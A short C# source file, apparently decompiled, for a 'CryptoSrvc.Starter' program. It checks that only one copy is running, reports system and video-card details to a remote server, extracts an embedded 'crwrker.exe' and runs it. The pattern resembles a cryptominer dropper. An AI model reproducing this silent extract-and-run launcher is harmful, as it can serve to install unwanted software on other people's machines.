using System;
using CryptoSrv.Shared.Managers;
using CryptoSrv.Starter;

namespace CryptoSrvc.Starter;

public class Program
{
	private const string EmbeddedFileName = "crwrker.exe";

	private const string EmbeddedNamespace = "CryptoSrvc.Starter";

	private static void Main(string[] args)
	{
		ProcessManager.IsFileRunned(AppManager.Asm.Location, out var count);
		if (count > 1)
		{
			return;
		}
		string text = $"System info: x{AppManager.Bits}({InfoManager.ProcessorCount} cores), {InfoManager.OperationSystem}, {InfoManager.VideoCardInfo}";
		LogManager logManager = new LogManager(AppManager.Server.Url);
		string message = "Try to install service. 1.4.0.0. " + text;
		logManager.Add("info", message, "1.4.0.0");
		try
		{
			StarterManager starterManager = new StarterManager(AppManager.Worker.OutDir, "crwrker.exe", "CryptoSrvc.Starter", AppManager.Asm);
			if (starterManager.Run(out var outMessage))
			{
				ExecuteManager executeManager = new ExecuteManager(outMessage, string.Join(" ", args));
				if (!executeManager.Run(out outMessage, waitExist: false))
				{
					logManager.Add("error", outMessage);
				}
			}
			else
			{
				logManager.Add("error", outMessage);
			}
		}
		catch (Exception ex)
		{
			logManager.Add("error", ex.Message + ex.StackTrace);
		}
	}
}
